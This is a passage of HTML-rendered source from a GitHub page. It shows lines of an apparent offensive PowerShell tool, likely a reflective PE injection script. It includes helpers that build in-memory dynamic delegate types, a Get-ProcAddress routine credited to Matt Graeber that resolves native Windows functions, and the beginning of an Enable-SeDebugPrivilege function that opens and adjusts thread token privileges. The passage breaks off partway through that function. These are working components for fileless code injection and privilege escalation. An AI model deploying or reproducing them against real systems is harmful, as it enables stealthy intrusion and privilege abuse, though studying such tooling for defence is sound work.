          <td id="LC997" class="blob-code blob-code-inner js-file-line">	        [<span class="pl-k">Type</span>[]]</td>
        </tr>
        <tr>
          <td id="L998" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="998"></td>
          <td id="LC998" class="blob-code blob-code-inner js-file-line">	        <span class="pl-smi">$Parameters</span> <span class="pl-k">=</span> (<span class="pl-c1">New-Object</span> Type[](<span class="pl-c1">0</span>))<span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L999" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="999"></td>
          <td id="LC999" class="blob-code blob-code-inner js-file-line">	        </td>
        </tr>
        <tr>
          <td id="L1000" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1000"></td>
          <td id="LC1000" class="blob-code blob-code-inner js-file-line">	        [<span class="pl-c1">Parameter</span>( <span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">1</span> )]</td>
        </tr>
        <tr>
          <td id="L1001" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1001"></td>
          <td id="LC1001" class="blob-code blob-code-inner js-file-line">	        [<span class="pl-k">Type</span>]</td>
        </tr>
        <tr>
          <td id="L1002" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1002"></td>
          <td id="LC1002" class="blob-code blob-code-inner js-file-line">	        <span class="pl-smi">$ReturnType</span> <span class="pl-k">=</span> [<span class="pl-k">Void</span>]</td>
        </tr>
        <tr>
          <td id="L1003" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1003"></td>
          <td id="LC1003" class="blob-code blob-code-inner js-file-line">	    )</td>
        </tr>
        <tr>
          <td id="L1004" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1004"></td>
          <td id="LC1004" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1005" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1005"></td>
          <td id="LC1005" class="blob-code blob-code-inner js-file-line">	    <span class="pl-smi">$Domain</span> <span class="pl-k">=</span> [<span class="pl-k">AppDomain</span>]::CurrentDomain</td>
        </tr>
        <tr>
          <td id="L1006" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1006"></td>
          <td id="LC1006" class="blob-code blob-code-inner js-file-line">	    <span class="pl-smi">$DynAssembly</span> <span class="pl-k">=</span> <span class="pl-c1">New-Object</span> System.Reflection.AssemblyName(<span class="pl-s"><span class="pl-pds">&#39;</span>ReflectedDelegate<span class="pl-pds">&#39;</span></span>)</td>
        </tr>
        <tr>
          <td id="L1007" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1007"></td>
          <td id="LC1007" class="blob-code blob-code-inner js-file-line">	    <span class="pl-smi">$AssemblyBuilder</span> <span class="pl-k">=</span> <span class="pl-smi">$Domain<span class="pl-smi">.DefineDynamicAssembly</span></span>(<span class="pl-smi">$DynAssembly</span><span class="pl-k">,</span> [<span class="pl-k">System.Reflection.Emit.AssemblyBuilderAccess</span>]::Run)</td>
        </tr>
        <tr>
          <td id="L1008" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1008"></td>
          <td id="LC1008" class="blob-code blob-code-inner js-file-line">	    <span class="pl-smi">$ModuleBuilder</span> <span class="pl-k">=</span> <span class="pl-smi">$AssemblyBuilder<span class="pl-smi">.DefineDynamicModule</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>InMemoryModule<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L1009" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1009"></td>
          <td id="LC1009" class="blob-code blob-code-inner js-file-line">	    <span class="pl-smi">$TypeBuilder</span> <span class="pl-k">=</span> <span class="pl-smi">$ModuleBuilder<span class="pl-smi">.DefineType</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>MyDelegateType<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Class, Public, Sealed, AnsiClass, AutoClass<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">System.MulticastDelegate</span>])</td>
        </tr>
        <tr>
          <td id="L1010" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1010"></td>
          <td id="LC1010" class="blob-code blob-code-inner js-file-line">	    <span class="pl-smi">$ConstructorBuilder</span> <span class="pl-k">=</span> <span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineConstructor</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>RTSpecialName, HideBySig, Public<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">System.Reflection.CallingConventions</span>]::Standard<span class="pl-k">,</span> <span class="pl-smi">$Parameters</span>)</td>
        </tr>
        <tr>
          <td id="L1011" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1011"></td>
          <td id="LC1011" class="blob-code blob-code-inner js-file-line">	    <span class="pl-smi">$ConstructorBuilder<span class="pl-smi">.SetImplementationFlags</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Runtime, Managed<span class="pl-pds">&#39;</span></span>)</td>
        </tr>
        <tr>
          <td id="L1012" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1012"></td>
          <td id="LC1012" class="blob-code blob-code-inner js-file-line">	    <span class="pl-smi">$MethodBuilder</span> <span class="pl-k">=</span> <span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineMethod</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Invoke<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public, HideBySig, NewSlot, Virtual<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$ReturnType</span><span class="pl-k">,</span> <span class="pl-smi">$Parameters</span>)</td>
        </tr>
        <tr>
          <td id="L1013" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1013"></td>
          <td id="LC1013" class="blob-code blob-code-inner js-file-line">	    <span class="pl-smi">$MethodBuilder<span class="pl-smi">.SetImplementationFlags</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Runtime, Managed<span class="pl-pds">&#39;</span></span>)</td>
        </tr>
        <tr>
          <td id="L1014" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1014"></td>
          <td id="LC1014" class="blob-code blob-code-inner js-file-line">	    </td>
        </tr>
        <tr>
          <td id="L1015" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1015"></td>
          <td id="LC1015" class="blob-code blob-code-inner js-file-line">	    <span class="pl-c1">Write-Output</span> <span class="pl-smi">$TypeBuilder<span class="pl-smi">.CreateType</span></span>()</td>
        </tr>
        <tr>
          <td id="L1016" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1016"></td>
          <td id="LC1016" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L1017" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1017"></td>
          <td id="LC1017" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1018" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1018"></td>
          <td id="LC1018" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1019" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1019"></td>
          <td id="LC1019" class="blob-code blob-code-inner js-file-line">	<span class="pl-c"><span class="pl-c">#</span>Function written by Matt Graeber, Twitter: @mattifestation, Blog: http://www.exploit-monday.com/</span></td>
        </tr>
        <tr>
          <td id="L1020" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1020"></td>
          <td id="LC1020" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">Function</span> <span class="pl-en">Get-ProcAddress</span></td>
        </tr>
        <tr>
          <td id="L1021" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1021"></td>
          <td id="LC1021" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L1022" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1022"></td>
          <td id="LC1022" class="blob-code blob-code-inner js-file-line">	    <span class="pl-k">Param</span></td>
        </tr>
        <tr>
          <td id="L1023" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1023"></td>
          <td id="LC1023" class="blob-code blob-code-inner js-file-line">	    (</td>
        </tr>
        <tr>
          <td id="L1024" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1024"></td>
          <td id="LC1024" class="blob-code blob-code-inner js-file-line">	        [<span class="pl-c1">OutputType</span>([<span class="pl-k">IntPtr</span>])]</td>
        </tr>
        <tr>
          <td id="L1025" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1025"></td>
          <td id="LC1025" class="blob-code blob-code-inner js-file-line">	    </td>
        </tr>
        <tr>
          <td id="L1026" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1026"></td>
          <td id="LC1026" class="blob-code blob-code-inner js-file-line">	        [<span class="pl-c1">Parameter</span>( <span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">0</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$True</span> )]</td>
        </tr>
        <tr>
          <td id="L1027" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1027"></td>
          <td id="LC1027" class="blob-code blob-code-inner js-file-line">	        [<span class="pl-k">String</span>]</td>
        </tr>
        <tr>
          <td id="L1028" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1028"></td>
          <td id="LC1028" class="blob-code blob-code-inner js-file-line">	        <span class="pl-smi">$Module</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L1029" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1029"></td>
          <td id="LC1029" class="blob-code blob-code-inner js-file-line">	        </td>
        </tr>
        <tr>
          <td id="L1030" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1030"></td>
          <td id="LC1030" class="blob-code blob-code-inner js-file-line">	        [<span class="pl-c1">Parameter</span>( <span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">1</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$True</span> )]</td>
        </tr>
        <tr>
          <td id="L1031" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1031"></td>
          <td id="LC1031" class="blob-code blob-code-inner js-file-line">	        [<span class="pl-k">String</span>]</td>
        </tr>
        <tr>
          <td id="L1032" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1032"></td>
          <td id="LC1032" class="blob-code blob-code-inner js-file-line">	        <span class="pl-smi">$Procedure</span></td>
        </tr>
        <tr>
          <td id="L1033" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1033"></td>
          <td id="LC1033" class="blob-code blob-code-inner js-file-line">	    )</td>
        </tr>
        <tr>
          <td id="L1034" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1034"></td>
          <td id="LC1034" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1035" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1035"></td>
          <td id="LC1035" class="blob-code blob-code-inner js-file-line">	    <span class="pl-c"><span class="pl-c">#</span> Get a reference to System.dll in the GAC</span></td>
        </tr>
        <tr>
          <td id="L1036" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1036"></td>
          <td id="LC1036" class="blob-code blob-code-inner js-file-line">	    <span class="pl-smi">$SystemAssembly</span> <span class="pl-k">=</span> [<span class="pl-k">AppDomain</span>]::CurrentDomain.GetAssemblies() <span class="pl-k">|</span></td>
        </tr>
        <tr>
          <td id="L1037" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1037"></td>
          <td id="LC1037" class="blob-code blob-code-inner js-file-line">	        <span class="pl-c1">Where-Object</span> { <span class="pl-c1">$_<span class="pl-smi">.GlobalAssemblyCache</span></span> <span class="pl-k">-And</span> <span class="pl-c1">$_<span class="pl-smi">.Location.Split</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>\\<span class="pl-pds">&#39;</span></span>)[<span class="pl-c1">-1</span>].Equals(<span class="pl-s"><span class="pl-pds">&#39;</span>System.dll<span class="pl-pds">&#39;</span></span>) }</td>
        </tr>
        <tr>
          <td id="L1038" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1038"></td>
          <td id="LC1038" class="blob-code blob-code-inner js-file-line">	    <span class="pl-smi">$UnsafeNativeMethods</span> <span class="pl-k">=</span> <span class="pl-smi">$SystemAssembly<span class="pl-smi">.GetType</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Microsoft.Win32.UnsafeNativeMethods<span class="pl-pds">&#39;</span></span>)</td>
        </tr>
        <tr>
          <td id="L1039" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1039"></td>
          <td id="LC1039" class="blob-code blob-code-inner js-file-line">	    <span class="pl-c"><span class="pl-c">#</span> Get a reference to the GetModuleHandle and GetProcAddress methods</span></td>
        </tr>
        <tr>
          <td id="L1040" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1040"></td>
          <td id="LC1040" class="blob-code blob-code-inner js-file-line">	    <span class="pl-smi">$GetModuleHandle</span> <span class="pl-k">=</span> <span class="pl-smi">$UnsafeNativeMethods<span class="pl-smi">.GetMethod</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>GetModuleHandle<span class="pl-pds">&#39;</span></span>)</td>
        </tr>
        <tr>
          <td id="L1041" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1041"></td>
          <td id="LC1041" class="blob-code blob-code-inner js-file-line">	    <span class="pl-smi">$GetProcAddress</span> <span class="pl-k">=</span> <span class="pl-smi">$UnsafeNativeMethods<span class="pl-smi">.GetMethod</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>GetProcAddress<span class="pl-pds">&#39;</span></span>)</td>
        </tr>
        <tr>
          <td id="L1042" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1042"></td>
          <td id="LC1042" class="blob-code blob-code-inner js-file-line">	    <span class="pl-c"><span class="pl-c">#</span> Get a handle to the module specified</span></td>
        </tr>
        <tr>
          <td id="L1043" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1043"></td>
          <td id="LC1043" class="blob-code blob-code-inner js-file-line">	    <span class="pl-smi">$Kern32Handle</span> <span class="pl-k">=</span> <span class="pl-smi">$GetModuleHandle<span class="pl-smi">.Invoke</span></span>(<span class="pl-c1">$null</span><span class="pl-k">,</span> <span class="pl-k">@</span>(<span class="pl-smi">$Module</span>))</td>
        </tr>
        <tr>
          <td id="L1044" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1044"></td>
          <td id="LC1044" class="blob-code blob-code-inner js-file-line">	    <span class="pl-smi">$tmpPtr</span> <span class="pl-k">=</span> <span class="pl-c1">New-Object</span> IntPtr</td>
        </tr>
        <tr>
          <td id="L1045" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1045"></td>
          <td id="LC1045" class="blob-code blob-code-inner js-file-line">	    <span class="pl-smi">$HandleRef</span> <span class="pl-k">=</span> <span class="pl-c1">New-Object</span> System.Runtime.InteropServices.HandleRef(<span class="pl-smi">$tmpPtr</span><span class="pl-k">,</span> <span class="pl-smi">$Kern32Handle</span>)</td>
        </tr>
        <tr>
          <td id="L1046" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1046"></td>
          <td id="LC1046" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L1047" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1047"></td>
          <td id="LC1047" class="blob-code blob-code-inner js-file-line">	    <span class="pl-c"><span class="pl-c">#</span> Return the address of the function</span></td>
        </tr>
        <tr>
          <td id="L1048" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1048"></td>
          <td id="LC1048" class="blob-code blob-code-inner js-file-line">	    <span class="pl-c1">Write-Output</span> <span class="pl-smi">$GetProcAddress<span class="pl-smi">.Invoke</span></span>(<span class="pl-c1">$null</span><span class="pl-k">,</span> <span class="pl-k">@</span>([<span class="pl-k">System.Runtime.InteropServices.HandleRef</span>]<span class="pl-smi">$HandleRef</span><span class="pl-k">,</span> <span class="pl-smi">$Procedure</span>))</td>
        </tr>
        <tr>
          <td id="L1049" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1049"></td>
          <td id="LC1049" class="blob-code blob-code-inner js-file-line">	}</td>
        </tr>
        <tr>
          <td id="L1050" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1050"></td>
          <td id="LC1050" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L1051" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1051"></td>
          <td id="LC1051" class="blob-code blob-code-inner js-file-line">	</td>
        </tr>
        <tr>
          <td id="L1052" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1052"></td>
          <td id="LC1052" class="blob-code blob-code-inner js-file-line">	<span class="pl-k">Function</span> <span class="pl-en">Enable-SeDebugPrivilege</span></td>
        </tr>
        <tr>
          <td id="L1053" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1053"></td>
          <td id="LC1053" class="blob-code blob-code-inner js-file-line">	{</td>
        </tr>
        <tr>
          <td id="L1054" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1054"></td>
          <td id="LC1054" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">Param</span>(</td>
        </tr>
        <tr>
          <td id="L1055" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1055"></td>
          <td id="LC1055" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">1</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1056" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1056"></td>
          <td id="LC1056" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Object</span>]</td>
        </tr>
        <tr>
          <td id="L1057" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1057"></td>
          <td id="LC1057" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L1058" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1058"></td>
          <td id="LC1058" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1059" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1059"></td>
          <td id="LC1059" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">2</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1060" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1060"></td>
          <td id="LC1060" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Object</span>]</td>
        </tr>
        <tr>
          <td id="L1061" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1061"></td>
          <td id="LC1061" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Types</span><span class="pl-k">,</span></td>
        </tr>
        <tr>
          <td id="L1062" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1062"></td>
          <td id="LC1062" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1063" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1063"></td>
          <td id="LC1063" class="blob-code blob-code-inner js-file-line">		[<span class="pl-c1">Parameter</span>(<span class="pl-v">Position</span> <span class="pl-k">=</span> <span class="pl-c1">3</span><span class="pl-k">,</span> <span class="pl-v">Mandatory</span> <span class="pl-k">=</span> <span class="pl-c1">$true</span>)]</td>
        </tr>
        <tr>
          <td id="L1064" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1064"></td>
          <td id="LC1064" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Object</span>]</td>
        </tr>
        <tr>
          <td id="L1065" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1065"></td>
          <td id="LC1065" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Constants</span></td>
        </tr>
        <tr>
          <td id="L1066" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1066"></td>
          <td id="LC1066" class="blob-code blob-code-inner js-file-line">		)</td>
        </tr>
        <tr>
          <td id="L1067" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1067"></td>
          <td id="LC1067" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1068" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1068"></td>
          <td id="LC1068" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$ThreadHandle</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.GetCurrentThread.Invoke</span></span>()</td>
        </tr>
        <tr>
          <td id="L1069" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1069"></td>
          <td id="LC1069" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$ThreadHandle</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L1070" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1070"></td>
          <td id="LC1070" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1071" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1071"></td>
          <td id="LC1071" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Unable to get the handle to the current thread<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L1072" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1072"></td>
          <td id="LC1072" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L1073" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1073"></td>
          <td id="LC1073" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L1074" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1074"></td>
          <td id="LC1074" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$ThreadToken</span> <span class="pl-k">=</span> [<span class="pl-k">IntPtr</span>]::Zero</td>
        </tr>
        <tr>
          <td id="L1075" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1075"></td>
          <td id="LC1075" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">Bool</span>]<span class="pl-smi">$Result</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.OpenThreadToken.Invoke</span></span>(<span class="pl-smi">$ThreadHandle</span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.TOKEN_QUERY</span></span> <span class="pl-k">-bor</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.TOKEN_ADJUST_PRIVILEGES</span></span><span class="pl-k">,</span> <span class="pl-c1">$false</span><span class="pl-k">,</span> [<span class="pl-k">Ref</span>]<span class="pl-smi">$ThreadToken</span>)</td>
        </tr>
        <tr>
          <td id="L1076" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1076"></td>
          <td id="LC1076" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$Result</span> <span class="pl-k">-eq</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L1077" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1077"></td>
          <td id="LC1077" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L1078" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1078"></td>
          <td id="LC1078" class="blob-code blob-code-inner js-file-line">			<span class="pl-smi">$ErrorCode</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::GetLastWin32Error()</td>
        </tr>
        <tr>
          <td id="L1079" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1079"></td>
          <td id="LC1079" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> (<span class="pl-smi">$ErrorCode</span> <span class="pl-k">-eq</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.ERROR_NO_TOKEN</span></span>)</td>
        </tr>
        <tr>
          <td id="L1080" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1080"></td>
          <td id="LC1080" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L1081" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1081"></td>
          <td id="LC1081" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$Result</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.ImpersonateSelf.Invoke</span></span>(<span class="pl-c1">3</span>)</td>
        </tr>
        <tr>
          <td id="L1082" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1082"></td>
          <td id="LC1082" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">if</span> (<span class="pl-smi">$Result</span> <span class="pl-k">-eq</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L1083" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1083"></td>
          <td id="LC1083" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L1084" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1084"></td>
          <td id="LC1084" class="blob-code blob-code-inner js-file-line">					<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Unable to impersonate self<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L1085" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1085"></td>
          <td id="LC1085" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L1086" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1086"></td>
          <td id="LC1086" class="blob-code blob-code-inner js-file-line">				</td>
        </tr>
        <tr>
          <td id="L1087" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1087"></td>
          <td id="LC1087" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$Result</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.OpenThreadToken.Invoke</span></span>(<span class="pl-smi">$ThreadHandle</span><span class="pl-k">,</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.TOKEN_QUERY</span></span> <span class="pl-k">-bor</span> <span class="pl-smi">$Win32Constants<span class="pl-smi">.TOKEN_ADJUST_PRIVILEGES</span></span><span class="pl-k">,</span> <span class="pl-c1">$false</span><span class="pl-k">,</span> [<span class="pl-k">Ref</span>]<span class="pl-smi">$ThreadToken</span>)</td>
        </tr>
        <tr>
          <td id="L1088" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1088"></td>
          <td id="LC1088" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">if</span> (<span class="pl-smi">$Result</span> <span class="pl-k">-eq</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L1089" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1089"></td>
          <td id="LC1089" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L1090" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1090"></td>
          <td id="LC1090" class="blob-code blob-code-inner js-file-line">					<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Unable to OpenThreadToken.<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L1091" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1091"></td>
          <td id="LC1091" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L1092" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="1092"></td>
          <td id="LC1092" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
